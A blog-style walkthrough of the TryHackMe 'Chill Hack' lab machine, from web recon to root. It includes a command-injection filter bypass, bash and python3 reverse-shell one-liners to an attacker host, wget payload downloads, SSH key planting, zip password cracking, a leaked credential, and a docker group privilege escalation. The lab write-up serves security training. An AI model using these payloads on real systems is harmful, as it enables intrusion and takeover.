Hi everyone ! !
Before I begin my usual introduction, I would like to celebrate my teachers' day ! Today I would like to solve easy level machine called `Chill Hack` on TryHackMe platform. Let's add our ip address to `/etc/hosts` to reach more suitable customized domain.

Begin with modifying `hosts` file:

`nano /etc/hosts`

![[TryHackMe/Chill Hack/images/1.png]]

You can give whatever you want as a `domain`.

## Reconnaissance

To check `web applications` or `web pages` utilize `curl` with both port `80` and `443`.

### Port 80 Test

![[TryHackMe/Chill Hack/images/2.png]]

As you can see above, `curl` initiated a request on port `80` then it retrieved response through `GET` method. Now you can observe the application running on `HTTP` protocol by default.

### Port 443 Test

To achieve `HTTP` with secure, you can simply add `:443` at the end of the `customized domain`.

`curl -v erkan.ucar:443`

![[TryHackMe/Chill Hack/images/3.png]]

Port `443` was not reachable ,so let me check also manually via browser.

![[TryHackMe/Chill Hack/images/4.png]]

By using this methodology, you can understand protocol in a better way.

![[TryHackMe/Chill Hack/images/5.png]]

Now, we are totally sure that there is no instance on port `443`, `HTTPS`. Direct access may reveal interesting information about the architecture in terms of any `login pages` or `source code leaks`.

Page includes a variety of categories + subcategories ,but we cannot interact with `backend` directly because there was not any input fields or user-interactive fields available.

I manually checked and show you places you can interact with:

![[TryHackMe/Chill Hack/images/6.png]]

I found an `input form` located on contact part. It may reveal something useful:

![[TryHackMe/Chill Hack/images/7.png]]

When I pressed `SEND` button with customized `simple XSS payload`, it did not respond because of our method. Let me also try with `Burpsuite`.

As you can see, It just takes `email` as `POST` method parameter. Therefore, let's use the payload on `email` field. No response received by browser. Now I understood that most probably backend did not handle requests or we have sanitization on fields. Fuzzing may reveal significant information about application.

### Fuzzing

The fastest option is more approachable at first because timing is important issue in most engagements. I would use a variety of fuzzing options to gather the same result.
#### dirsearch
Fastest scanner I have ever seen.

Default usage:
`dirsearch -u erkan.ucar`

![[TryHackMe/Chill Hack/images/9.png]]

`/secret/` is the most identical compared to default `web` configuration files :) Achieve the same result with `gobuster`.

#### gobuster
Precious tool able to traverse directory to directory until the latest one.

`gobuster dir -u <URL> -w <wordlist> [options]`

 I will do basic fuzzing operation to application ,so simple options are acceptable.

`gobuster dir -u http://erkan.ucar -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt `

![[TryHackMe/Chill Hack/images/10.png]]

Observe that same results appeared on the prompt. Let's shift on `/secret/` path. Command & Execution page can be shown in below.

![[TryHackMe/Chill Hack/images/11.png]]

Also the source code is important whether It sends the requests through backend via `POST` method.

![[TryHackMe/Chill Hack/images/12.png]]

Exactly, It is going to send requests to web server. Embedding `ls`directly did not work since the creator sanitized ,but `whoami` works !

![[13.png]]

We are `www-data` by default on `web server`. Let me also add `;` to catch the response of the application.

![[TryHackMe/Chill Hack/images/13.png]]

Simply the sanitization can be bypassed just by adding `;` at the end of the command. However, it is a default approach to use multiple command at once. 

`ls;`

![[TryHackMe/Chill Hack/images/14.png]]

For example:

`ls; whoami;`

![[TryHackMe/Chill Hack/images/15.png]]

Still `cat` command sanitized by the app.

![[TryHackMe/Chill Hack/images/16.png]]

we are on `/var/www/html/secret` path.

![[TryHackMe/Chill Hack/images/17.png]]

In a different way, let's use `reverse shell` to bypass web application's read restrictions. 

![[TryHackMe/Chill Hack/images/18.png]]

Our application has `bash` binary ,so I will use this payload:

`sh -i >& /dev/tcp/10.10.10.10/9001 0>&1`

it did not work.  Let's try `python3`.

![[TryHackMe/Chill Hack/images/19.png]]


Done ! ! !

The reverse shell payload in below worked !

export RHOST="10.0.0.1";export RPORT=4242;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

![[TryHackMe/Chill Hack/images/20.png]]


## Exploitation

Let's analyze the `index.php` source code:



As a `www-data` user, we can run following script:
![[TryHackMe/Chill Hack/images/21.png]]

This is the content of the `.helpline.sh` hidden shell script:

![[TryHackMe/Chill Hack/images/22.png]]

With the help of `bash` binary we can also run `hidden scripts` on the command line.

![[TryHackMe/Chill Hack/images/23.png]]

I tried to inject `reverse shel` to escalate my privileges ,but still I encounter permission issues:

![[TryHackMe/Chill Hack/images/24.png]]

![[TryHackMe/Chill Hack/images/25.png]]

By utilizing `wget`, sending `linpeas.sh` unlocked. Let me run `linpeas`:

Deploy `python` local server with `python -m http.server 3000`

`wget http://10.14.92.189:3000/linpeas.sh`

![[TryHackMe/Chill Hack/images/26.png]]

Give executable permission -> `chmod +x linpeas.sh`

Then...

`linpeas.sh` keep frozen ,so let me move `.helpline.sh` again.

I thought that the file was located on different directory `apaar` ,so what If I run as `apaar` to this script.

`sudo -u apaar /home/apaar/.helpline.sh`

It works ! ! !

Now, lets embed another python `reverse shell`:

![[TryHackMe/Chill Hack/images/28.png]]

Since the `script` reflects my commands, embedding direct shell may work !

![[TryHackMe/Chill Hack/images/29.png]]

`/bin/bash` then `/bin/sh` worked on my instance.

`message` variable gets whatever we give whether it is string or command. However, spawning straight shell gave the result ultimately.

![[TryHackMe/Chill Hack/images/30.png]]

`apaar` also can run `.helpline.sh` exactly as it is.

![[TryHackMe/Chill Hack/images/31.png]]

Reach user flag with the one-liner command `cd /home/apaar; cat local.txt;`

After that, I discovered an `.ssh` directory then it may be compatible and easier to upgrade my shell to direct `SSH` shell. In my opinion, reverse shell intentionally stucks on `/bin/sh` shell. `SSH` may work more compatible.

![[TryHackMe/Chill Hack/images/32.png]]

I got the `SSH` private key of `apaar`. Generate with the following command:

`ssh-keygen -f apaar`

Embed it on `authorized_keys` on target:

`echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDpKEzQTcHOQwitnWRCnq8iMOt9gaWtk7VuCxvvl5N9X root@kali" > authorized_keys`

![[TryHackMe/Chill Hack/images/33.png]]

Let me add on `authorized_keys` & give `400` permission on the file.

Give the permission on `private key`
`chmod 400 apaar`

Connect with this private key to target host
`ssh -i apaar 10.10.119.114`

![[TryHackMe/Chill Hack/images/34.png]]

I do not know why `linpeas` disappear ,but let me download again:

`apaar@ubuntu:/tmp$ wget http://10.14.92.189:3000/linpeas.sh`

Then it again stuck...

After a couple of minutes I found really interesting `image` file named hacker-with-laptop then I decided to download it:

![[TryHackMe/Chill Hack/images/35.png]]

On the target I opened `python3` local web server then downloaded through `wget` to my machine.

![[TryHackMe/Chill Hack/images/36.png]]



![[TryHackMe/Chill Hack/images/37.png]]

Even though, I did not give any password, `backup` archive is extracted successfully.

backup requires password:

┌──(root㉿kali)-[/home/kali]
└─# unzip backup.zip
Archive:  backup.zip
[backup.zip] source_code.php password: 

To crack zip file utilizing `zip2john` is a great approach:

`zip2john backup.zip > hash.txt`

run the `john` to crack pass:

`john --format=pkzip hash.txt`

John's default wordlist did not find anything ,so I used `rockyou`.

`john --wordlist=/usr/share/wordlists/rockyou.txt --format=pkzip hash.txt`

![[TryHackMe/Chill Hack/images/38.png]]

let's unzip it !

`unzip backup.zip`

then `cat source_code.php`

![[TryHackMe/Chill Hack/images/39.png]]
Observe that we have `base64` encoded password ,so let's apply `Cyberchef` to decode it.

![[TryHackMe/Chill Hack/images/40.png]]

Yes the user:pass combination is now:

`anurodh:!d0ntKn0wmYp@ssw0rd`

Trying `SSH` will be useful:

`ssh anurodh@10.10.119.114`

We are done !

![[TryHackMe/Chill Hack/images/41.png]]

I could not run `linpeas.sh` before ,so manual enumeration is suitable in this scenario let's find `SUID` enabled binaries in this user:

[HackTricks](https://book.hacktricks.xyz/linux-hardening/useful-linux-commands)

`find / -perm /u=s -ls 2>/dev/null`

![[TryHackMe/Chill Hack/images/42.png]]

the most interesting one is `daemon` itself. Except the root, this is suitable to escalate privilege because we cannot run commands as root. Even we try the system blocks:

On [GFTObins](https://gtfobins.github.io/gtfobins/at/) you can reach the following binary exploit:

`echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null`

Again it required to root in order to do operations:

![[TryHackMe/Chill Hack/images/43.png]]

Try the `groups` whether it is on the same or not. To find any vector useful:

`id`
`uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)`

Interesting we have `docker`. Let me check if it is possible to find docker binary on GFTObins:

yess I got it:

[reach out](https://gtfobins.github.io/gtfobins/docker/)

`sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

`Binary vector` did not work:
Shell may be run if we can run `docker`.

`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

We are done !

![[TryHackMe/Chill Hack/images/44.png]]

Get the `root` flag here:

![[TryHackMe/Chill Hack/images/45.png]]